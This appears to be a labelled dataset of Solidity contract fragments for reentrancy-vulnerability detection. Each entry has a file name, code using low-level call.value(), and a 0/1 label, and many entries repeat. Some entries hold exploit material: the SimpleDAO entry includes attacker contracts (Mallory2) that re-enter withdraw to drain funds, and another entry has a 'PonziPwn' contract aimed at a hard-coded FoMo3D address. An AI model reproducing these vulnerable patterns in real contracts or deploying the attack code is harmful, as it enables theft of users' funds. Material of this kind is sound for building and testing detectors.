emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
1293 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
1294 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
1295 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
1296 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
1297 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1298 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1299 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1300 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1301 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1302 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1303 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1304 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1305 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1306 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1307 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1308 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1309 40241.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
1310 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
1311 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
1312 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
1313 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
1314 SimpleDAO.sol
function withdraw(uint amount) {
if (credit[msg.sender]>= amount) {
msg.sender.call.value(amount)();
credit[msg.sender]-=amount;
function getJackpot() {
owner.send(this.balance);
function() {
dao.withdraw(dao.queryCredit(this));
contract Mallory2 {
SimpleDAO public dao;
address owner;
bool public performAttack = true;
function attack()  {
dao.donate.value(1)(this);
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
1
---------------------------------
1315 32605.sol
function forward(address destination, uint value, bytes data) public onlyOwner {
require(destination.call.value(value)(data));
Forwarded(destination, value, data);
contract MetaIdentityManager {
uint adminTimeLock;
uint userTimeLock;
uint adminRate;
address relay;
event LogIdentityCreated(address indexed identity, address indexed creator, address owner, address indexed recoveryKey);
event LogOwnerAdded(address indexed identity, address indexed owner, address instigator);
event LogOwnerRemoved(address indexed identity, address indexed owner, address instigator);
event LogRecoveryChanged(address indexed identity, address indexed recoveryKey,address instigator);
event LogMigrationInitiated(address indexed identity, address indexed newIdManager, address instigator);
event LogMigrationCanceled(address indexed identity, address indexed newIdManager, address instigator);
event LogMigrationFinalized(address indexed identity, address indexed newIdManager, address instigator);
mapping(address => mapping(address => uint)) owners;
mapping(address => address) recoveryKeys;
mapping(address => mapping(address => uint)) limiter;
mapping(address => uint) public migrationInitiated;
mapping(address => address) public migrationNewAddress;
modifier onlyAuthorized() {
require(msg.sender == relay || checkMessageData(msg.sender));
modifier onlyOwner(address identity, address sender) {
require(isOwner(identity, sender));
modifier onlyOlderOwner(address identity, address sender) {
require(isOlderOwner(identity, sender));
modifier onlyRecovery(address identity, address sender) {
require(recoveryKeys[identity] == sender);
modifier rateLimited(Proxy identity, address sender) {
require(limiter[identity][sender] < (now - adminRate));
limiter[identity][sender] = now;
modifier validAddress(address addr) {
require(addr != address(0));
function createIdentityWithCall(address owner, address recoveryKey, address destination, bytes data) public validAddress(recoveryKey) {
Proxy identity = new Proxy();
owners[identity][owner] = now - adminTimeLock;
recoveryKeys[identity] = recoveryKey;
LogIdentityCreated(identity, msg.sender, owner,  recoveryKey);
identity.forward(destination, 0, data);
function forwardTo(address sender, Proxy identity, address destination, uint value, bytes data) public onlyAuthorized onlyOwner(identity, sender){
identity.forward(destination, value, data);
0
---------------------------------
1316 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1317 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1318 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1319 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1320 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1321 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1322 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1323 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1324 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1325 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1326 18170.sol
function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() {
require(_amount <= wingsETHRewards);
require(_contract.call.value(_amount)());
wingsETHRewards -= _amount;
0
---------------------------------
1327 274.sol
function buy(IMultiToken _mtkn, uint256 _minimumReturn, address[] _exchanges, bytes _datas, uint[] _datasIndexes, uint256[] _values) public payable {
require(_datasIndexes.length == _exchanges.length + 1, "buy: _datasIndexes should start with 0 and end with LENGTH");
require(_values.length == _exchanges.length, "buy: _values should have the same length as _exchanges");
for (uint i = 0; i < _exchanges.length; i++) {
bytes memory data = new bytes(_datasIndexes[i + 1] - _datasIndexes[i]);
for (uint j = _datasIndexes[i]; j < _datasIndexes[i + 1]; j++) {
data[j - _datasIndexes[i]] = _datas[j];
require(_exchanges[i].call.value(_values[i])(data), "buy: exchange arbitrary call failed");
j = _mtkn.totalSupply();
uint256 bestAmount = uint256(-1);
for (i = _mtkn.tokensCount(); i > 0; i--) {
ERC20 token = _mtkn.tokens(i - 1);
token.approve(_mtkn, token.balanceOf(this));
uint256 amount = j.mul(token.balanceOf(this)).div(token.balanceOf(_mtkn));
if (amount < bestAmount) {
bestAmount = amount;
require(bestAmount >= _minimumReturn, "buy: return value is too low");
_mtkn.bundle(msg.sender, bestAmount);
if (address(this).balance > 0) {
msg.sender.transfer(address(this).balance);
1
---------------------------------
1328 2072.sol
function executeProposal(uint proposalNumber, bytes transactionBytecode) public {
Proposal storage p = proposals[proposalNumber];
require(now > p.minExecutionDate && !p.executed && p.proposalHash == keccak256(abi.encodePacked(p.recipient, p.amount, transactionBytecode)));
uint quorum = 0;
uint yea = 0;
uint nay = 0;
for (uint i = 0; i <  p.votes.length; ++i) {
Vote storage v = p.votes[i];
uint voteWeight = sharesTokenAddress.balanceOf(v.voter);
quorum += voteWeight;
if (v.inSupport) {
yea += voteWeight;
} else {
nay += voteWeight;
require(quorum >= minimumQuorum);
if (yea > nay ) {
p.executed = true;
require(p.recipient.call.value(p.amount)(transactionBytecode));
p.proposalPassed = true;
} else {
p.proposalPassed = false;
emit ProposalTallied(proposalNumber, yea - nay, quorum, p.proposalPassed);
0
---------------------------------
1329 3050.sol
function withdraw() external;
contract BlankContract {
constructor() public {}
contract AirDropWinner {
FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
constructor() public {
if(!address(fomo3d).call.value(0.1 ether)()) {
fomo3d.withdraw();
selfdestruct(msg.sender);
contract PonziPwn {
FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
address private admin;
uint256 private blankContractGasLimit = 20000;
uint256 private pwnContractGasLimit = 250000;
uint256 private gasPrice = 10;
uint256 private gasPriceInWei = gasPrice*1e9;
uint256 private blankContractCost = blankContractGasLimit*gasPrice ;
uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;
uint256 private maxAmount = 10 ether;
modifier onlyAdmin() {
require(msg.sender == admin);
constructor() public {
admin = msg.sender;
function deployContracts(uint256 _nContracts,address _newSender) private {
for(uint256 _i; _i < _nContracts; _i++) {
if(_i++ == _nContracts) {
address(_newSender).call.value(0.1 ether)();
new AirDropWinner();
new BlankContract();
0
---------------------------------
1330 3174.sol
function endRound(F3Ddatasets.EventReturns memory _eventData_) private returns (F3Ddatasets.EventReturns) {
uint256 _rID = rID_;
uint256 _winPID = round_[_rID].plyr;
uint256 _winTID = round_[_rID].team;
uint256 _pot = round_[_rID].pot;
uint256 _win = (_pot.mul(48)) / 100;
uint256 _com = (_pot / 50);
uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
if (_dust > 0) {
_gen = _gen.sub(_dust);
_res = _res.add(_dust);
plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
if (!address(Team_Forwarder).call.value(_com)(bytes4(keccak256("deposit()")))) {
_p3d = _p3d.add(_com);
_com = 0;
round_[_rID].mask = _ppt.add(round_[_rID].mask);
if (_p3d > 0) {
if (!address(Team_Forwarder).call.value(_p3d)(bytes4(keccak256("deposit()")))){
_res = _p3d.add(_res);
_eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
_eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
_eventData_.winnerAddr = plyr_[_winPID].addr;
_eventData_.winnerName = plyr_[_winPID].name;
_eventData_.amountWon = _win;
_eventData_.genAmount = _gen;
_eventData_.P3DAmount = _p3d;
_eventData_.newPot = _res;
rID_++;
_rID++;
round_[_rID].strt = now;
round_[_rID].end = now.add(rndInit_).add(rndGap_);
round_[_rID].pot = _res;
return(_eventData_);
function endRound(F3Ddatasets.EventReturns memory _eventData_) private returns (F3Ddatasets.EventReturns) {
uint256 _rID = rID_;
uint256 _winPID = round_[_rID].plyr;
uint256 _winTID = round_[_rID].team;
uint256 _pot = round_[_rID].pot;
uint256 _win = (_pot.mul(48)) / 100;
uint256 _com = (_pot / 50);
uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
